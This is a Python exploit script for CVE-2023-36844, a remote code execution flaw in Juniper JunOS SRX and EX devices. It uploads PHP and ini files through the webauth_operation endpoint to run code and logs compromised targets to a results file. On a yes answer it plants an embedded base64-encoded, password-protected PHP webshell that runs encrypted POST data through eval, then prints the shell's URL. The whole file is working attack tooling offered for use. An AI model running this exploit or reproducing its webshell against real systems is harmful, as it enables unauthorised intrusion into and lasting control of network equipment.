#!/user/bin/env python3
# -*- coding: utf-8 -*-
# Author: Pari Malam

import requests
import re
import base64
from pub.com.reqset import ReqSet
from colorama import Fore
from sys import stdout

FG = Fore.GREEN
FR = Fore.RED
FW = Fore.WHITE
FY = Fore.YELLOW
FC = Fore.CYAN

PHP_UPLOAD_URL = "/webauth_operation.php"
INI_UPLOAD_URL = "/webauth_operation.php?PHPRC=/var/tmp/"

class Cve_2023_36844:
    def send_php_payload2(self,url, payload):
        PHP_Payload = f"<?php echo('watchTowr:::{payload}:::rwoThctaw');?>"
        PHP_Payload_bytes = PHP_Payload.encode('ascii')
        PHP_Payload_base64 = base64.b64encode(PHP_Payload_bytes).decode('ascii')

        headers = {"User-Agent": self.header, "Content-Type": "application/x-www-form-urlencoded"}
        data = {"rs": "do_upload",
                "rsargs[0]": f"[{{\"fileData\":\"data:text/html;base64,PD9waHAgQHNlc3Npb25fc3RhcnQoKTtAc2V0X3RpbWVfbGltaXQoMCk7QGVycm9yX3JlcG9ydGluZygwKTtmdW5jdGlvbiBlbmNvZGUoJEQsJEspe2ZvcigkaT0wOyRpPHN0cmxlbigkRCk7JGkrKyl7JGM9JEtbJGkrMSYxNV07JERbJGldPSREWyRpXV4kYzt9cmV0dXJuICREO30kcGFzcz0ncGFzcyc7JHBheWxvYWROYW1lPSdwYXlsb2FkJzska2V5PSczYzZlMGI4YTljMTUyMjRhJztpZihpc3NldCgkX1BPU1RbJHBhc3NdKSl7JGRhdGE9ZW5jb2RlKGJhc2U2NF9kZWNvZGUoJF9QT1NUWyRwYXNzXSksJGtleSk7aWYoaXNzZXQoJF9TRVNTSU9OWyRwYXlsb2FkTmFtZV0pKXskcGF5bG9hZD1lbmNvZGUoJF9TRVNTSU9OWyRwYXlsb2FkTmFtZV0sJGtleSk7aWYoc3RycG9zKCRwYXlsb2FkLCJnZXRCYXNpY3NJbmZvIik9PT1mYWxzZSl7JHBheWxvYWQ9ZW5jb2RlKCRwYXlsb2FkLCRrZXkpO31ldmFsKCRwYXlsb2FkKTtlY2hvIHN1YnN0cihtZDUoJHBhc3MuJGtleSksMCwxNik7ZWNobyBiYXNlNjRfZW5jb2RlKGVuY29kZShAcnVuKCRkYXRhKSwka2V5KSk7ZWNobyBzdWJzdHIobWQ1KCRwYXNzLiRrZXkpLDE2KTt9ZWxzZXtpZihzdHJwb3MoJGRhdGEsImdldEJhc2ljc0luZm8iKSE9PWZhbHNlKXskX1NFU1NJT05bJHBheWxvYWROYW1lXT1lbmNvZGUoJGRhdGEsJGtleSk7fX19Pz48IS0t\",\"fileName\":\"watchTowr.php\",\"csize\":675}}]"}
        response = requests.post(url, headers=headers, data=data, verify=False)

        php_file = re.findall("0: '(.*?)'\},", response.text)
        php_path = str(php_file[0])

        return php_path
    def banners(self):

        stdout.write("                                                                                         \n")
        stdout.write(
            "" + Fore.LIGHTRED_EX + "     ██╗██╗   ██╗███╗   ██╗██╗██████╗ ███████╗██████╗       ██████╗  ██████╗███████╗\n")
        stdout.write(
            "" + Fore.LIGHTRED_EX + "     ██║██║   ██║████╗  ██║██║██╔══██╗██╔════╝██╔══██╗      ██╔══██╗██╔════╝██╔════╝\n")
        stdout.write(
            "" + Fore.LIGHTRED_EX + "     ██║██║   ██║██╔██╗ ██║██║██████╔╝█████╗  ██████╔╝█████╗██████╔╝██║     █████╗  \n")
        stdout.write(
            "" + Fore.LIGHTRED_EX + "██   ██║██║   ██║██║╚██╗██║██║██╔═══╝ ██╔══╝  ██╔══██╗╚════╝██╔══██╗██║     ██╔══╝  \n")
        stdout.write(
            "" + Fore.LIGHTRED_EX + "╚█████╔╝╚██████╔╝██║ ╚████║██║██║     ███████╗██║  ██║      ██║  ██║╚██████╗███████\n")
        stdout.write(
            "" + Fore.LIGHTRED_EX + "╚════╝  ╚═════╝ ╚═╝  ╚═══╝╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝      ╚═╝  ╚═╝ ╚═════╝╚══════╝ \n")
        stdout.write(
            "" + Fore.YELLOW + "═════════════╦═════════════════════════════════╦═══════════════════════════════════\n")
        stdout.write("" + Fore.YELLOW + "╔════════════╩═════════════════════════════════╩═════════════════════════════╗\n")
        stdout.write(
            "" + Fore.YELLOW + "║ \x1b[38;2;255;20;147m• " + Fore.GREEN + "AUTHOR             " + Fore.RED + "    |" + Fore.LIGHTWHITE_EX + "   PARI MALAM                                    " + Fore.YELLOW + "║\n")
        stdout.write("" + Fore.YELLOW + "╔════════════════════════════════════════════════════════════════════════════╝\n")
        stdout.write(
            "" + Fore.YELLOW + "║ \x1b[38;2;255;20;147m• " + Fore.GREEN + "GITHUB             " + Fore.RED + "    |" + Fore.LIGHTWHITE_EX + "   GITHUB.COM/PARI-MALAM                         " + Fore.YELLOW + "║\n")
        stdout.write("" + Fore.YELLOW + "╚════════════════════════════════════════════════════════════════════════════╝\n")
        print(
            f"{Fore.YELLOW}[CVE-2023-36844] - {Fore.GREEN}Remote Code Execution in Juniper JunOS within SRX and EX Series products.\n")
    
    
    def send_php_payload(self,url, payload):
        PHP_Payload = f"<?php echo('watchTowr:::{payload}:::rwoThctaw');?>"
        PHP_Payload_bytes = PHP_Payload.encode('ascii')
        PHP_Payload_base64 = base64.b64encode(PHP_Payload_bytes).decode('ascii')
    
        headers = {"User-Agent": self.header, "Content-Type": "application/x-www-form-urlencoded"}
        data = {"rs": "do_upload",
                "rsargs[0]": f"[{{\"fileData\":\"data:text/html;base64,{PHP_Payload_base64}\",\"fileName\":\"watchTowr.php\",\"csize\":{len(PHP_Payload)}}}]"}
        response = requests.post(url, headers=headers, data=data, verify=self.ssl,proxies=self.proxy)
    
        php_file = re.findall("0: '(.*?)'\},", response.text)
        php_path = str(php_file[0])
    
        return php_path
    
    
    def send_ini_payload(self,url, payload):
        ini_payload = f'auto_prepend_file="/var/tmp/{payload}"'
        ini_payload_bytes = ini_payload.encode('ascii')
        ini_payload_b64 = base64.b64encode(ini_payload_bytes).decode('ascii')
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        data = {"rs": "do_upload",
                "rsargs[0]": f"[{{\"fileData\":\"data:plain/text;base64,{ini_payload_b64}\",\"fileName\":\"watchTowr.ini\",\"csize\":{len(ini_payload)}}}]"}
        response = requests.post(url, headers=headers, data=data, verify=self.ssl,proxies=self.proxy)
        ini_file = re.findall("0: '(.*?)'\},", response.text)
        ini_file = ini_file[0]
        return ini_file
    
    
    def execute_payload(self,url, ini_file):
        exec_req = f"{url}{INI_UPLOAD_URL}{ini_file}"
        exec_response = requests.get(exec_req, verify=self.ssl,proxies=self.proxy)
        exec_success = re.findall("watchTowr:::(.*?):::rwoThctaw", exec_response.text)
        return exec_success[0]
    
    
    def process_target(self,target, payload):
        try:
            print(f"{FY}[CVE-2023-36844] - {FW} - {target}")
            php_path = self.send_php_payload(f"{target}{PHP_UPLOAD_URL}", payload)
            print(
                f"{FY}[CVE-2023-36844] - {FW} - {target} - {FG} - Successfully uploaded the .php file, found at path: /var/tmp/{php_path}")
            ini_file = self.send_ini_payload(f"{target}{PHP_UPLOAD_URL}", php_path)
            with open("./result/juniper_2023_36844.txt", "a") as file:
                file.write(f"{target}{PHP_UPLOAD_URL} - /var/tmp/{php_path}\t")
            print(
                f"{FY}[CVE-2023-36844] - {FW} - {target} - {FG} - Successfully uploaded the .ini file, found at path: /var/tmp/{ini_file}")
            exec_success = self.execute_payload(target, ini_file)
            with open("./result/juniper_2023_36844.txt", "a") as file:
                file.write(f"{target}{PHP_UPLOAD_URL} - /var/tmp/{ini_file}\t")
            print(f"{FY}[CVE-2023-36844] - {FW} - {target} - {FG} - Execution Results for: {exec_success}")
            print(f"{FY}[CVE-2023-36844] - {FW} - {target} - {FG} - Shell Use: {target}/webauth_operation.php?PHPRC=/var/tmp/{ini_file}")
            with open("./result/juniper_2023_36844.txt", "a") as file:
                file.write(f"{target} - {exec_success}\n")
            return True
        except Exception as e:
            print(f"{FY}[CVE-2023-36844] - {FW} - {target} {FR} - Error processing: {str(e)}")
            return False
    def process_target2(self,target, payload):
        try:
            print(f"{FY}[CVE-2023-36844] - {FW} - {target}")
            php_path = self.send_php_payload2(f"{target}{PHP_UPLOAD_URL}", payload)
            print(
                f"{FY}[CVE-2023-36844] - {FW} - {target} - {FG} - Successfully uploaded the .php file, found at path: /var/tmp/{php_path}")
            ini_file = self.send_ini_payload(f"{target}{PHP_UPLOAD_URL}", php_path)
            with open("./result/juniper_2023_36844.txt", "a") as file:
                file.write(f"{target}{PHP_UPLOAD_URL} - /var/tmp/{php_path}\t")
            print(
                f"{FY}[CVE-2023-36844] - {FW} - {target} - {FG} - Successfully uploaded the .ini file, found at path: /var/tmp/{ini_file}")
            # exec_success = self.execute_payload(target, ini_file)
            # with open("./result/juniper_2023_36844.txt", "a") as file:
            #     file.write(f"{target}{PHP_UPLOAD_URL} - /var/tmp/{ini_file}\t")
            # print(f"{FY}[CVE-2023-36844] - {FW} - {target} - {FG} - Execution Results for: {exec_success}")
            print(f"{FY}[CVE-2023-36844] - {FW} - {target} - {FG} - Shell Use: {target}/webauth_operation.php?PHPRC=/var/tmp/{ini_file}")
            # with open("./result/juniper_2023_36844.txt", "a") as file:
            #     file.write(f"{target} - {exec_success}\n")

        except Exception as e:
            print(f"{FY}[CVE-2023-36844] - {FW} - {target} {FR} - Error processing: {str(e)}")
    
    def main(self,target):
        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        self.header = target["header"]

        proxy = target["proxy"]
        _, self.proxy = ReqSet(proxy=proxy)
        self.banners()

    
        payload =  "php_uname()"
        if self.process_target(url,payload):
            from rich.prompt import Prompt
            choose = Prompt.ask("[b yellow]是否上传webshell([b red]y/n[/b red])")
            if choose == "y":
                self.process_target2(url, payload)
            else:
                pass


